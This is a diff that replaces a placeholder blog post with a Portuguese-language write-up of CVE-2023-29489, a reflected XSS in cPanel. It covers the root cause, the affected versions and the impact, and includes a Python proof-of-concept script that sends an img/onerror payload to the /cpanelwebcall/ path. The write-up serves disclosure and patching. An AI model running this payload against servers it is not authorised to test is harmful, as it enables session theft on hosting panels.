@@ -1,17 +1,160 @@
 ---
 layout: post
-title:  "Test Post"
-date:   2014-12-10
+title:  "CVE-2023-29489"
+date:   2024-05-14
 ---
 
-<p class="intro"><span class="dropcap">L</span>orem ipsum thor smash liege-bastogne-liege landbouwkrediet ombregt krabbe, rouleur derby is for lovers bonk giro gilbert bidon. Driedaagse de panne-koksijde monte paschi eroica, nevele gimondi berendries off the back cassette tenbosse.</p>
+Table of contents:
+* Sumário
+* Descrição
+* Prova de Conceito
+* Impacto
+* Conclusão
+* Referências
 
-Bahamontes lanterne rouge normandie belgium. Fred paris-nice arrivere, for omnium commissaire ronde van vlaanderen horizontally stiff but vertically compliant muur, valkenberg jens paris-roubaix. Meyrueis belleville cavendish bianchi, rochefort echelon in soigneur ten dam omloop het volk, bettini aerts! Tour de mont aigoual cat among the pigeons rekelberg omloop het nieuwsblad paris-nice, dwars door vlaanderen coppi the colnago knockteberg anduze.
+---
 
-Kaperij lanterne rouge musette rund um koln bruges thor smash, geraardsbergen riis petacchi molteni pedaling squares. Virenque vande velde, valkenberg gutter pantani parcours gaul domestique, tilford campagnolo around madone. Bruyneel criterium ritte, gorgeous george the trousselier feed zone bruges nokere koerse, parcours gilbert garin? Anquetil valkenberg bettini cat among the pigeons.
+### Sumário
 
-Campagnolo the hors delai de wolf as the toto turns venga venga venga, sanchez nys. Pantani hell of the north oude kwaremont nitto koppenberg, tiegemberg van steenbergen lombardie flamme rouge lemond e3 prijs vlaanderen.
+A CVE-2023-29489[1] trata-se de uma vulnerabilidade de Cross-Site Scripting (XSS)[2] refletido identificada no software de painel de controle de hospedagem cPanel[3], amplamente utilizado na web. A vulnerabilidade XSS permite que um atacante execute scripts maliciosos em uma página que está sendo acessada por outros usuários. No caso da CVE-2023-29489, o atacante poderia explorá-la para executar códigos arbitrários em um servidor web gerenciado pelo cPanel. Além do atacante não precisar estar autenticado, a vulnerabilidade é explorável independentemente da porta de gerenciamento do cPanel (2080, 2082, 2083, 2086) serem expostas externamente ou não. Isso significa que os sites nas portas 80 e 443 também são vulneráveis ao XSS se estiverem sendo gerenciados pelo cPanel.
 
-Planckaert berg ter stene freire gorgeous george in rouleur derby, vaughters fabianese omloop het volk rouleur play rouleur derby. Bottechia petacchi, milan-san remo van summeren off the back cutters the cassette.
+Essa vulnerabilidade foi identificada em 26 de abril de 2023 pela equipe de segurança da Assetnote[4], uma empresa de segurança da Austrália. A vulnerabilidade impacta versões do cPanel anteriores a 11.109.9999.116 e foi corrigida nas versões 11.109.9999.116, 11.108.0.13, 11.106.0.18 e 11.102.0.31 ou em versões posteriores.
 
-Nyvelocity pyrenees vande velde merckx. La fleche wallonne fixie pau, with muur hors categorie boonen aerts operacion puerto, topsport vlaanderen pereiro randonneur. This greek text is produced by rouleur derby, almost certainly the best fantasy cycling game in the world snob trousselier col du galibier, flanders venga venga venga suitcase of courage cutters kolobnev molenberg.
+---
+
+### Descrição
+
+O cPanel é um software feito em Perl[5] com binários gerados a partir do código Perl. Baseado nos binários que podem ser acessados no diretório /cgi-sys/ nas portas de gerenciamento do cPanel, nota-se a existência de binários que eram códigos Perl e que são chamados remotamente por meio de solicitações HTTP.
+
+Além dos binários dentro de /cgi-sys/, algumas funcionalidades e aplicativos da web do cPanel são atendidos por meio do binário cpsrvd. O binário cpsrvd é executado nas portas: 2082, 2083, 2086, 2087. Para isso, o cPanel utiliza as funcionalidades de proxy reverso do Apache[6] e a configuração para isso é encontrada em /etc/apache2/conf/httpd/conf/. Essas configurações de proxying e aliasse de scripts definem áreas potencialmente interessantes para ataques:
+
+```
+ProxyPass /cpanelwebcall/ http://127.0.0.1:2082/cpanelwebcall/ max=1 retry=0
+
+... omitted for brevity ...
+
+ScriptAlias /.cpanel/dcv /usr/local/cpanel/cgi-priv/get_local.cgi
+
+RewriteEngine On
+
+RewriteCond %{REQUEST_URI} ^/\.well-known/acme-challenge/[0-9a-zA-Z_-]+$ [OR]
+RewriteCond %{REQUEST_URI} ^/\.well-known/cpanel-dcv/[0-9a-zA-Z_-]+$ [OR]
+RewriteCond %{REQUEST_URI} ^/\.well-known/pki-validation/[A-F0-9]{32}\.txt(?:\ Sectigo\ DCV)?$ [OR]
+RewriteCond %{REQUEST_URI} ^/\.well-known/pki-validation/(?:\ Ballot169)?
+RewriteRule ^ /.cpanel/dcv [passthrough]
+```
+
+
+O arquivo Cpanel/Server/Handlers/Httpd.pm possui uma lógica especifica referente a manipulação de caminhos. Isso permite com que fossem mapeadas as superfícies de ataques. Dentro do httpd.pm existe um trecho de código que roteia todas as solicitações de um caminho que comece por /panelwebcall para uma função chamada _server_cpanelwebcall que por sua vez chama outra função, chamada Chanel::Server::WebCalls::handle com uma parte da URL como argumento:
+
+```perl
+elsif ( 0 == rindex( $doc_path, '/cpanelwebcall/', 0 ) ) {
+        # First 15 chars are “/cpanelwebcall/”
+        _serve_cpanelwebcall(
+            $self->get_server_obj(),
+            substr( $doc_path, 15 ),
+        );
+    }
+```
+
+
+A função _serve_cpanelwebcall se parece com isso:
+
+```perl
+sub _serve_cpanelwebcall ( $server_obj, $webcall_uri_piece ) {
+    require Cpanel::Server::WebCalls;
+    my $out = Cpanel::Server::WebCalls::handle($webcall_uri_piece);
+
+    $server_obj->respond_200_ok_text($out);
+
+    return;
+}
+```
+
+
+Que nos leva para a função Chanel::Server::WebCalls::handle:
+
+```perl
+sub handle ($request) {
+
+    my $id = extract_id_from_request($request);
+    substr( $request, 0, length $id ) = q<>;
+
+    Cpanel::WebCalls::ID::is_valid($id) or do {
+        die _http_invalid_params_err("Invalid webcall ID: $id");
+    };
+```
+
+A função handle extrai um ID da solicitação e em seguida modifica a solicitação, removendo o ID. Se o ID não for válido, ele gera um erro indicando a solicitação inválida. Quando o erro acontece, a função _httpd_invalid_params_err é chamada, onde essa função cria uma exceção chamada cpsrvd::BadRequest que leva até o módulo Cpanel::Server::Handlers::ErrorPage. Dentro desse módulo existe uma variável chamada message_html. A vulnerabilidade está nessa variável, pois ela não está sanitizando a mensagem de erro ao inserir o ID inválido.
+
+---
+
+### Prova de Conceito
+
+Exploit:
+
+```python
+#!/usr/bin/env python3
+import requests
+import argparse
+import re
+
+def exploit(target):
+    payload = "<img%20src=x%20onerror='alert(1)'>foo"
+    if not re.match(r'^https?://', target):
+        target = f"https://{target}"
+
+    try:
+        response = requests.get(f"{target}/cpanelwebcall/{payload}")
+        if payload in response.text:
+            return f"The payload [{payload}] worked!"
+        else:
+            return f"The target [{target}] is not vulnerable."
+    except requests.exceptions.RequestException as e:
+            return(f"Error making request for {target} -> {e}")
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2023-29489 | XSS in cPanel")
+    parser.add_argument("-t", "--target", required=True)
+    args = parser.parse_args()
+
+    try:
+        print(exploit(args.target))
+    except KeyboardInterrupt:
+         exit(1)
+    except EOFError:
+         exit(1)
+if __name__ == '__main__':
+    main()
+```
+
+
+---
+
+### Impacto
+
+O impacto dessa vulnerabilidade permite que um invasor execute códigos JavaScript arbitrários, sem estar autenticado, em quase todas as portas de um servidor web que utiliza o cPanel.  Isso ocorre devido as regras de proxy, onde é possível através das portas 80 e 443 acessar o diretório /cpanel/, pois estará sendo redirecionado para as portas de gerenciamento do cPanel pelo Apache.
+
+O fato das portas de gerenciamento do cPanel serem vulneráveis a XSS permite que um atacante roube a sessão de um usuário legítimo, uma vez agindo como um usuário autenticado, é possível fazer upload de uma web shell[7] e obter a execução remota de comandos no servidor.
+
+A vulnerabilidade apresenta uma ameaça significava a segurança da aplicação e é altamente recomendado que os administradores de sistemas atualizem para a versão mais recente.
+
+--
+
+### Conclusão
+
+O cPanel tem uma superfície vulnerável a ataque consideravelmente grande, essa vulnerabilidade permite que o atacante execute scripts maliciosos em páginas acessadas pelos usuários comuns, onde o atacante não precisa estar autenticado para explorá-la. A vulnerabilidade é explorável independente da porta do cPanel (2080, 2082, 2083, 2086) estar exposta externamente ou não.  A exploração dessa vulnerabilidade pode resultar na execução de códigos JavaScript arbitrário em praticamente todas as portas de um servidor web que utilize o cPanel. Isso ocorre devido as regras de proxy que permitem o acesso ao diretório /cpanel/ mesmo nas portas 80 e 443, redirecionando as solicitações para as portas de gerenciamento do cPanel devido os proxys do Apache.
+
+A vulnerabilidade foi corrigida com patches disponíveis nas versões posteriores ao cPanel 11.109.9999.116. É fundamental que os administradores de sistemas atualizem seus sistemas para a versão mais recente do cPanel e implementem as correções disponíveis para mitigar as ameaças.
+
+---
+
+### Referências
+
+* [1] [MITRE - CVE-2023-29489](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29489)
+* [2] [PortSwigger - Cross-site Scripting](https://portswigger.net/web-security/cross-site-scripting)
+* [3] [Hostinger - Domine o cPanel: Prós, Contras e Como Usar](https://www.hostinger.com.br/tutoriais/cpanel-o-que-e-painel-de-hospedagem)
+* [4] [Assetnote - Finding XSS in a million websites (cPanel CVE-2023-29489)](https://www.assetnote.io/resources/research/finding-xss-in-a-million-websites-cpanel-cve-2023-29489)
+* [5] [Perl - Flexible & Powerful](https://www.perl.org)
+* [6] [Apache - Software for the public good](https://www.apache.org)
+* [7] [Wikipedia - Web Shell](https://en.wikipedia.org/wiki/Web_shell)
